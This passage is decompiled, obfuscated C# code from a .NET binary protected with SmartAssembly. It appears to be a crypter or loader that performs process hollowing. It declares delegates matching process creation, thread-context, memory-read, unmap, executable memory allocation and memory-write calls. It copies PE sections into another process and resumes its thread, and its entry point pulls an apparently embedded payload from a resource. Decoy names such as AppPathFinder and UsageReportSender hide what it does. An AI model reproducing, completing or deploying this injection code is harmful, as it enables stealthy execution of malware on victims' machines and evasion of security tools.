                  Ⴈ.Ⴅ.Ⴀ ⴀ = Ⴈ.Ⴅ.Ⴄ<Ⴈ.Ⴅ.Ⴀ>(Ⴈ.Ⴅ.Ⴄ(18363.4, 0, 1351706969M, MyComputer.Ⴗ(834542791, 4), -474676936L, ႷႭ.ႥႭ(490613519, 0)));
                  IntPtr Ⴄ2 = Ⴜ[0];
                  num14 = new IntPtr(Ⴈ.Ⴅ.Ⴅ(checked (num8 + 52), (short) 14732, Ⴗ, (ushort) 28610));
                  IntPtr Ⴐ2 = num14;
                  num15 = new IntPtr(Ⴈ.Ⴅ.Ⴅ(checked (num8 + 80), (short) 6290, Ⴗ, (ushort) 18798));
                  IntPtr Ⴀ2 = num15;
                  Ⴍ1 = ⴀ(Ⴄ2, Ⴐ2, Ⴀ2, 12288, 64);
                  num11 = 24;
                  continue;
                case 1:
                  checked { ++num17; }
                  num11 = 23;
                  continue;
                case 2:
                  num18 = 18U;
                  num11 = 26;
                  continue;
                case 3:
                  flag2 = false;
                  Ⴈ.Ⴅ.Ⴗ ⴗ = Ⴈ.Ⴅ.Ⴄ<Ⴈ.Ⴅ.Ⴗ>(Ⴈ.Ⴅ.Ⴄ(4630.78, -161758332, 512392022M, Ⴈ.Ⴀ.Ⴐ(1468303764, 0), -708287634L, MyComputer.Ⴗ(834542797, 5)));
                  IntPtr Ⴐ3 = Ⴜ[0];
                  num12 = new IntPtr(checked ((long) Ⴈ1[41] + 8L));
                  IntPtr Ⴄ3 = num12;
                  ref IntPtr local1 = ref Ⴃ1;
                  num13 = new IntPtr(4);
                  IntPtr Ⴓ = num13;
                  ref IntPtr local2 = ref Ⴄ1;
                  num11 = !ⴗ(Ⴐ3, Ⴄ3, ref local1, Ⴓ, ref local2) ? 25 : 22;
                  continue;
                case 4:
                  goto label_72;
                case 5:
                  Ⴈ1[44] = checked ((uint) (ႷႳ.Ⴈ(ref Ⴍ1, 379, 370) + Ⴈ.Ⴅ.Ⴅ(num8 + 40, (short) 1081, Ⴗ, (ushort) 23727)));
                  num11 = 19;
                  continue;
                case 6:
                  numArray6 = new byte[checked (numArray5[4] - 1 + 1)];
                  goto case 9;
                case 7:
                  AppPathFinder.Ⴍ((Array) Ⴗ, checked (num8 + 248 + num17 * 40), (Array) numArray5, 0, 40, 473, 450);
                  num11 = 6;
                  continue;
                case 9:
                  num11 = 16;
                  continue;
                case 10:
                  flag2 = false;
                  Ⴈ.Ⴅ.Ⴈ ⴈ2 = ⴈ1;
                  IntPtr Ⴅ1 = Ⴜ[0];
                  num15 = new IntPtr(checked ((long) Ⴈ1[41] + 8L));
                  IntPtr Ⴍ2 = num15;
                  byte[] Ⴃ2 = Ⴈ.Ⴅ.Ⴀ(ႷႳ.Ⴈ(ref Ⴍ1, 290, 299));
                  num14 = new IntPtr(4);
                  IntPtr Ⴐ4 = num14;
                  ref IntPtr local3 = ref Ⴄ1;
                  flag3 = ⴈ2(Ⴅ1, Ⴍ2, Ⴃ2, Ⴐ4, ref local3);
                  num11 = 5;
                  continue;
                case 12:
                  goto label_66;
                case 13:
                  length = numArray5.Length;
                  str2 = length.ToString();
                  Ⴈ.Ⴅ.Ⴈ ⴈ3 = ⴈ1;
                  IntPtr Ⴅ2 = Ⴜ[0];
                  num15 = new IntPtr(checked (ႷႳ.Ⴈ(ref Ⴍ1, 297, 288) + numArray5[3]));
                  IntPtr Ⴍ3 = num15;
                  byte[] Ⴃ3 = numArray6;
                  num14 = new IntPtr(numArray6.Length);
                  IntPtr Ⴐ5 = num14;
                  ref IntPtr local4 = ref Ⴄ1;
                  flag3 = ⴈ3(Ⴅ2, Ⴍ3, Ⴃ3, Ⴐ5, ref local4);
                  num11 = 1;
                  continue;
                case 14:
                  numArray5 = new int[10];
                  flag2 = true;
                  num16 = checked (num9 - 1);
                  num17 = 0;
                  num11 = 23;
                  continue;
                case 15:
                  num11 = 13;
                  continue;
                case 16:
                  AppPathFinder.Ⴍ((Array) Ⴗ, numArray5[5], (Array) numArray6, 0, numArray6.Length, 400, 395);
                  goto case 15;
                case 17:
                  int num20 = Ⴈ.Ⴅ.Ⴄ<Ⴈ.Ⴅ.Ⴜ>(Ⴈ.Ⴅ.Ⴄ(0.0, -180899721, 1244395517M, ႷႭ.ႥႳ(1491049111, 6), -989281361L, Ⴈ.Ⴀ.Ⴐ(1468303658, 5)))(Ⴜ[1]);
                  num11 = 4;
                  continue;
                case 18:
                  num11 = false ? 17 : 17;
                  continue;
                case 19:
                  int num21 = Ⴈ.Ⴅ.Ⴄ<Ⴈ.Ⴅ.Ⴃ>(Ⴈ.Ⴅ.Ⴄ(17051.0, 1006800026, -889059843M, Ⴈ.Ⴀ.Ⴐ(1468303809, 5), 0L, ႷႭ.ႥႳ(1491049109, 8)))(Ⴜ[1], Ⴈ1) ? 1 : 0;
                  num11 = 18;
                  continue;
                case 20:
                  numArray2 = (byte[]) null;
                  flag3 = ⴈ1(Ⴜ[0], Ⴍ1, Ⴗ, Ⴐ1, ref Ⴄ1);
                  num11 = 14;
                  continue;
                case 21:
                case 25:
                  num11 = 12;
                  continue;
                case 22:
                  num11 = Ⴈ.Ⴅ.Ⴄ<Ⴈ.Ⴅ.Ⴅ>(Ⴈ.Ⴅ.Ⴄ(23232.8, 2028707899, 1426583930M, ႷႭ.ႥႳ(1491049185, 5), -752323096L, Ⴈ.Ⴀ.Ⴐ(1468303867, 4)))(Ⴜ[0], Ⴃ1) != 0U ? 2 : 0;
                  continue;
                case 23:
                  num11 = num17 <= num16 ? 27 : 10;
                  continue;
                case 24:
                  ⴈ1 = Ⴈ.Ⴅ.Ⴄ<Ⴈ.Ⴅ.Ⴈ>(Ⴈ.Ⴅ.Ⴄ(0.0, 1754998787, 814879642M, ႷႭ.ႥႭ(490613523, 6), 1328419434L, SimpleZip.Ⴓ(661403127, 2)));
                  num11 = 20;
                  continue;
                case 26:
                  checked { ++num18; }
                  num11 = num18 <= 46U ? 26 : 25;
                  continue;
                case 27:
                  numArray5[0] = 13;
                  numArray5[5] = checked ((int) byte.MaxValue + numArray5[0]);
                  num11 = 7;
                  continue;
                default:
                  Ⴈ1 = new uint[179];
                  Ⴈ1[0] = 65538U;
                  num11 = !Ⴈ.Ⴅ.Ⴄ<Ⴈ.Ⴅ.Ⴃ>(Ⴈ.Ⴅ.Ⴄ(21010.0, 328708502, 1554825148M, ႷႭ.ႥႭ(490613540, 2), 2075751399L, SimpleZip.Ⴓ(661403019, 4)))(Ⴜ[1], Ⴈ1) ? 12 : 3;
                  continue;
              }
            }
          }
          catch (Exception ex)
          {
            SimpleZip.ႤႼ.Ⴄ(ex, 749, 651);
            UsageReportSender.Ⴅ(508, 428);
          }
label_66:
          num19 = 0;
label_67:
          while (true)
          {
            switch (num19)
            {
              case 1:
              case 2:
              case 3:
                goto label_69;
              case 4:
              case 5:
                goto label_72;
              default:
                PoweredBy.Ⴄ(Ⴈ.Ⴄ.ႳႳ(ႷႳ.Ⴈ(ref Ⴜ[2], 263, 270), 755, 683), 453, 420);
                num19 = 3;
                continue;
            }
          }
label_69:
          num19 = 4;
          goto label_67;
        }
        catch (Exception ex)
        {
          objArray = new object[45]
          {
            (object) num2,
            (object) flag1,
            (object) num4,
            (object) num3,
            (object) thread,
            (object) num5,
            (object) num6,
            (object) num7,
            (object) Ⴐ1,
            (object) num9,
            (object) Ⴀ1,
            (object) numArray4,
            (object) numArray2,
            (object) Ⴜ,
            (object) num8,
            (object) flag2,
            (object) str1,
            (object) Ⴃ1,
            (object) flag3,
            (object) Ⴄ1,
            (object) Ⴈ1,
            (object) Ⴍ1,
            (object) ⴈ1,
            (object) numArray5,
            (object) str2,
            (object) numArray6,
            (object) num17,
            (object) num18,
            (object) index,
            (object) strArray,
            (object) numArray1,
            (object) numArray3,
            (object) num10,
            (object) num12,
            (object) num13,
            (object) num14,
            (object) num15,
            (object) num16,
            (object) length,
            (object) Ⴅ,
            (object) Ⴈ,
            (object) Ⴍ,
            (object) Ⴃ,
            (object) Ⴗ,
            (object) Ⴀ
          };
          object[] objects = objArray;
          SmartAssembly.SmartExceptionsCore.StackFrameHelper.CreateExceptionN(ex, objects);
          throw;
        }
label_72:
        switch (4)
        {
        }
      }
      catch (Exception ex)
      {
        int num22;
        object[] objects = new object[50]
        {
          (object) num2,
          (object) flag1,
          (object) num4,
          (object) num3,
          (object) thread,
          (object) num5,
          (object) num6,
          (object) num7,
          (object) Ⴐ1,
          (object) num9,
          (object) Ⴀ1,
          (object) numArray4,
          (object) numArray2,
          (object) Ⴜ,
          (object) num8,
          (object) flag2,
          (object) str1,
          (object) Ⴃ1,
          (object) flag3,
          (object) Ⴄ1,
          (object) Ⴈ1,
          (object) Ⴍ1,
          (object) ⴈ1,
          (object) numArray5,
          (object) str2,
          (object) numArray6,
          (object) num17,
          (object) num18,
          (object) index,
          (object) strArray,
          (object) numArray1,
          (object) numArray3,
          (object) num10,
          (object) num12,
          (object) num13,
          (object) num14,
          (object) num15,
          (object) num16,
          (object) length,
          (object) objArray,
          (object) num1,
          (object) num11,
          (object) num19,
          (object) num22,
          (object) Ⴅ,
          (object) Ⴈ,
          (object) Ⴍ,
          (object) Ⴃ,
          (object) Ⴗ,
          (object) Ⴀ
        };
        SmartAssembly.SmartExceptionsCore.StackFrameHelper.CreateExceptionN(ex, objects);
        throw;
      }
    }

    [STAThread]
    public static void Ⴅ()
    {
      if (!SmartAssembly.License.License.Validate())
        return;
      int num1;
      int num2;
      int num3;
      int num4;
      int num5;
      bool flag1;
      bool flag2;
      bool flag3;
      byte num6;
      ResourceManager resourceManager;
      bool flag4;
      Decimal num7;
      int num8;
      int num9;
      object[] objArray;
      try
      {
        if (!UnhandledExceptionHandlerWithUI.AttachApp())
          return;
        SmartAssembly.SmartUsageCore.DoNotPruneAttribute.ႰႣ();
        num1 = 3;
        while (true)
        {
          switch (num1)
          {
            case 0:
              goto label_69;
            case 2:
              goto label_60;
            case 4:
              goto label_34;
            default:
              if (!SmartAssembly.License.License.Validate())
              {
                num1 = 0;
                continue;
              }
              goto label_8;
          }
        }
label_69:
        return;
label_60:
        return;
label_34:
        return;
label_8:
        try
        {
          num2 = 0;
          while (true)
          {
            switch (num2)
            {
              case 1:
              case 4:
                goto label_11;
              case 2:
                goto label_7;
              case 3:
                goto label_2;
              default:
                num2 = UnhandledExceptionHandlerWithUI.AttachApp() ? 4 : 2;
                continue;
            }
          }
label_7:
          return;
label_2:
          return;
label_11:
          try
          {
            num3 = 12;
label_12:
            while (true)
            {
              int num10;
              int num11;
              switch (num3)
              {
                case 0:
                  num5 = 5;
                  flag2 = true;
                  num3 = 26;
                  continue;
                case 1:
                  num5 = 16;
                  num3 = !flag4 ? 16 : 16;
                  continue;
                case 2:
                  num5 = 19;
                  num7 = 1871987856M;
                  num3 = 20;
                  continue;
                case 3:
                case 22:
                case 28:
                  goto label_72;
                case 4:
                  num5 = 2;
                  Ⴈ.Ⴅ.Ⴗ();
                  num3 = 19;
                  continue;
                case 5:
                  num10 = 1;
                  goto label_64;
                case 6:
                  num3 = 2;
                  continue;
                case 7:
                  num5 = 13;
                  checked { ++num6; }
                  num3 = num6 <= (byte) 28 ? 7 : 27;
                  continue;
                case 8:
                  num11 = num8;
                  break;
                case 9:
                  resourceManager = new ResourceManager(ႷႭ.ႥႭ(490613749, 7), SmartAssembly.SmartUsageCore.DoNotPruneAttribute.Ⴐ(457, 417));
                  num3 = 23;
                  continue;
                case 10:
                  num5 = 12;
                  num6 = (byte) 6;
                  num3 = 7;
                  continue;
                case 11:
                  num3 = 15;
                  continue;
                case 13:
                  num10 = num4;
                  goto label_64;
                case 14:
                  goto label_61;
                case 15:
                  num3 = 29;
                  continue;
                case 16:
                  num3 = 17;
                  continue;
                case 17:
                  num5 = 18;
                  Ⴈ.Ⴅ.Ⴗ(27503.1f, (ushort) 3061, (sbyte) 0, (sbyte) 101, Ⴈ.Ⴅ.Ⴗ((byte[]) SimpleZip.ႤႼ.Ⴜ(resourceManager, Ⴈ.Ⴅ.Ⴄ(31126.0, 212719497, 0M, MyComputer.Ⴗ(834542756, 2), 1127241103L, ႷႭ.ႥႭ(490613702, 1)), 831, 833), 16294.082f, 1520815252UL, MyComputer.Ⴗ(834542769, 0)), 0UL);
                  goto case 6;
                case 18:
                  num5 = 7;
                  flag3 = true;
                  num3 = 24;
                  continue;
                case 19:
                  num5 = 3;
                  flag1 = true;
                  num3 = 25;
                  continue;
                case 20:
                  goto label_75;
                case 21:
                  num11 = num8 + 1;
                  break;
                case 23:
                  num5 = 15;
                  flag4 = true;
                  num3 = 1;
                  continue;
                case 24:
                  num5 = 8;
                  num3 = !flag3 ? 11 : 11;
                  continue;
                case 25:
                  num5 = 4;
                  num3 = !flag1 ? 29 : 0;
                  continue;
                case 26:
                  num5 = 6;
                  num3 = !flag2 ? 15 : 18;
                  continue;
                case 27:
                  num5 = 14;
                  goto case 9;
                case 29:
                  num3 = 10;
                  continue;
                default:
                  UsageReportSender.Ⴅ(43, 123);
                  num4 = -2;
                  num3 = 4;
                  continue;
              }
              num8 = 0;
              int num12;
              switch (num11)
              {
                case 0:
                  num12 = 3;
                  break;
                case 1:
                  goto label_11;
                case 2:
                  num12 = 4;
                  break;
                case 3:
                  num12 = 19;
                  break;
                case 4:
                  num12 = 25;
                  break;
                case 5:
                  num12 = 0;
                  break;
                case 6:
                  num12 = 26;
                  break;
                case 7:
                  num12 = 18;
                  break;
                case 8:
                  num12 = 24;
                  break;
                case 9:
                  num12 = 11;
                  break;
                case 10:
                  num12 = 15;
                  break;
                case 11:
                  num12 = 29;
                  break;
                case 12:
                  num12 = 10;
                  break;
                case 13:
                  num12 = 7;
                  break;
                case 14:
                  num12 = 27;
                  break;
                case 15:
                  num12 = 23;
                  break;
                case 16:
                  num12 = 1;
                  break;
                case 17:
                  num12 = 16;
                  break;
                case 18:
                  num12 = 17;
                  break;
                case 19:
                  num12 = 2;
                  break;
                case 20:
                  num12 = 20;
                  break;
                default:
                  num12 = 3;
                  break;
              }
              num3 = num12;
              continue;
label_64:
              int num13;
              switch (num10)
              {
                case 0:
                  num13 = 28;
                  break;
                case 1:
                  num13 = 21;
                  break;
                default:
                  num13 = 28;
                  break;
              }
              num3 = num13;
            }
label_61:
            num8 = num5;
            num3 = num4 > -2 ? 13 : 5;
            goto label_12;
          }
          catch (Exception ex) when (ex is Exception & num4 != 0 & num8 == 0)
          {
            SimpleZip.ႤႼ.Ⴄ(ex, 448, 422);
            goto label_61;
          }
label_72:
          num9 = 1;
label_73:
          switch (num9)
          {
            case 0:
            case 3:
            case 5:
              break;
            case 2:
              return;
            case 4:
              UsageReportSender.Ⴅ(507, 427);
              return;
            case 6:
              return;
            default:
              throw ႷႼ.Ⴄ(-2146828237, 783, 892);
          }
label_75:
          num9 = num8 == 0 ? 2 : 4;
          goto label_73;
        }
        catch (Exception ex)
        {
          objArray = new object[10]
          {
            (object) flag4,
            (object) flag1,
            (object) num7,
            (object) resourceManager,
            (object) flag2,
            (object) flag3,
            (object) num6,
            (object) num4,
            (object) num8,
            (object) num5
          };
          object[] objects = objArray;
          UnhandledExceptionHandler.EntryPointException(ex, objects);
        }
      }
      catch (Exception ex)
      {
        object[] objects = new object[15]
        {
          (object) flag4,
          (object) flag1,
          (object) num7,
          (object) resourceManager,
          (object) flag2,
          (object) flag3,
          (object) num6,
          (object) num4,
          (object) num8,
          (object) num5,
          (object) objArray,
          (object) num1,
          (object) num2,
          (object) num3,
          (object) num9
        };
        UnhandledExceptionHandler.EntryPointException(ex, objects);
      }
    }

    static Ⴅ()
    {
      try
      {
        SmartAssembly.SmartUsageCore.DoNotPruneAttribute.ႰႣ();
      }
      catch (Exception ex)
      {
        SmartAssembly.SmartExceptionsCore.StackFrameHelper.CreateException0(ex);
        throw;
      }
    }

    internal static void Ⴍ([In] string obj0, [In] int obj1, [In] int obj2)
    {
      int num1;
      try
      {
        num1 = 0;
        while (true)
        {
          switch (num1)
          {
            case 2:
            case 4:
              num1 = 0;
              continue;
            case 3:
            case 5:
              goto label_7;
            default:
              int num2;
              switch (obj2 ^ obj1)
              {
                case 11:
                  num2 = 3;
                  break;
                default:
                  num2 = 4;
                  break;
              }
              num1 = num2;
              continue;
          }
        }
label_7:
        Console.WriteLine(obj0);
      }
      catch (Exception ex)
      {
        // ISSUE: variable of a boxed type
        __Boxed<int> o1 = (ValueType) num1;
        int num3;
        // ISSUE: variable of a boxed type
        __Boxed<int> o2 = (ValueType) num3;
        string o3 = obj0;
        // ISSUE: variable of a boxed type
        __Boxed<int> o4 = (ValueType) obj1;
        // ISSUE: variable of a boxed type
        __Boxed<int> o5 = (ValueType) obj2;
        SmartAssembly.SmartExceptionsCore.StackFrameHelper.CreateException5(ex, (object) o1, (object) o2, (object) o3, (object) o4, (object) o5);
        throw;
      }
    }

    internal static bool Ⴐ([In] string obj0, [In] string obj1, [In] int obj2, [In] int obj3)
    {
      int num1;
      try
      {
label_3:
        int num2;
        switch (obj3 ^ obj2)
        {
          case 90:
            num2 = 4;
            break;
          default:
            num2 = 3;
            break;
        }
        num1 = num2;
        while (true)
        {
          switch (num1)
          {
            case 0:
            case 1:
            case 4:
              goto label_8;
            case 3:
              num1 = 5;
              continue;
            case 5:
            case 7:
              goto label_3;
            case 6:
              num1 = 5;
              continue;
            default:
              // ISSUE: method reference
              RuntimeMethodHandle runtimeMethodHandle = __methodref (Ⴈ.Ⴅ.Ⴐ);
              num1 = 5;
              continue;
          }
        }
label_8:
        return obj0 == obj1;
      }
      catch (Exception ex)
      {
        // ISSUE: variable of a boxed type
        __Boxed<int> o1 = (ValueType) num1;
        string o2 = obj0;
        string o3 = obj1;
        // ISSUE: variable of a boxed type
        __Boxed<int> o4 = (ValueType) obj2;
        // ISSUE: variable of a boxed type
        __Boxed<int> o5 = (ValueType) obj3;
        SmartAssembly.SmartExceptionsCore.StackFrameHelper.CreateException5(ex, (object) o1, (object) o2, (object) o3, (object) o4, (object) o5);
        throw;
      }
    }

    internal static bool ႥႣ([In] Thread obj0, [In] int obj1, [In] int obj2)
    {
      int num1;
      try
      {
label_3:
        int num2;
        switch (obj2 ^ obj1)
        {
          case 3:
            num2 = 1;
            break;
          default:
            num2 = 4;
            break;
        }
        num1 = num2;
        while (true)
        {
          switch (num1)
          {
            case 1:
            case 3:
            case 5:
              goto label_8;
            case 2:
              goto label_3;
            case 4:
              num1 = 2;
              continue;
            case 6:
            case 7:
              num1 = 2;
              continue;
            default:
              // ISSUE: method reference
              RuntimeMethodHandle runtimeMethodHandle = __methodref (Ⴈ.Ⴅ.ႥႣ);
              num1 = 2;
              continue;
          }
        }
label_8:
        return obj0.IsAlive;
      }
      catch (Exception ex)
      {
        // ISSUE: variable of a boxed type
        __Boxed<int> o1 = (ValueType) num1;
        Thread o2 = obj0;
        // ISSUE: variable of a boxed type
        __Boxed<int> o3 = (ValueType) obj1;
        // ISSUE: variable of a boxed type
        __Boxed<int> o4 = (ValueType) obj2;
        SmartAssembly.SmartExceptionsCore.StackFrameHelper.CreateException4(ex, (object) o1, (object) o2, (object) o3, (object) o4);
        throw;
      }
    }

    internal static void ႥႥ([In] Control obj0, [In] bool obj1, [In] int obj2, [In] int obj3)
    {
      int num1;
      try
      {
        num1 = 3;
        while (true)
        {
          switch (num1)
          {
            case 0:
            case 2:
              num1 = 3;
              continue;
            case 1:
              goto label_8;
            case 4:
              goto label_7;
            case 5:
              goto label_10;
            default:
              int num2;
              switch (obj3 ^ obj2)
              {
                case 61:
                  num2 = 4;
                  break;
                default:
                  num2 = 2;
                  break;
              }
              num1 = num2;
              continue;
          }
        }
label_8:
        return;
label_10:
        return;
label_7:
        obj0.TabStop = obj1;
      }
      catch (Exception ex)
      {
        // ISSUE: variable of a boxed type
        __Boxed<int> o1 = (ValueType) num1;
        int num3;
        // ISSUE: variable of a boxed type
        __Boxed<int> o2 = (ValueType) num3;
        Control o3 = obj0;
        // ISSUE: variable of a boxed type
        __Boxed<bool> o4 = (ValueType) obj1;
        // ISSUE: variable of a boxed type
        __Boxed<int> o5 = (ValueType) obj2;
        // ISSUE: variable of a boxed type
        __Boxed<int> o6 = (ValueType) obj3;
        SmartAssembly.SmartExceptionsCore.StackFrameHelper.CreateException6(ex, (object) o1, (object) o2, (object) o3, (object) o4, (object) o5, (object) o6);
        throw;
      }
    }

    public delegate bool Ⴓ(
      string Ⴐ,
      string Ⴀ,
      IntPtr Ⴄ,
      IntPtr Ⴓ,
      bool Ⴈ,
      int Ⴃ,
      IntPtr Ⴅ,
      string Ⴍ,
      byte[] Ⴗ,
      IntPtr[] Ⴜ);

    public delegate bool Ⴃ(IntPtr Ⴐ, uint[] Ⴈ);

    public delegate bool Ⴗ(IntPtr Ⴐ, IntPtr Ⴄ, ref IntPtr Ⴍ, IntPtr Ⴓ, ref IntPtr Ⴃ);

    public delegate uint Ⴅ(IntPtr Ⴍ, IntPtr Ⴃ);

    public delegate IntPtr Ⴀ(IntPtr Ⴄ, IntPtr Ⴐ, IntPtr Ⴀ, int Ⴗ, int Ⴃ);

    public delegate bool Ⴈ(IntPtr Ⴅ, IntPtr Ⴍ, byte[] Ⴃ, IntPtr Ⴐ, ref IntPtr Ⴄ);

    public delegate int Ⴜ(IntPtr Ⴓ);
  }
}
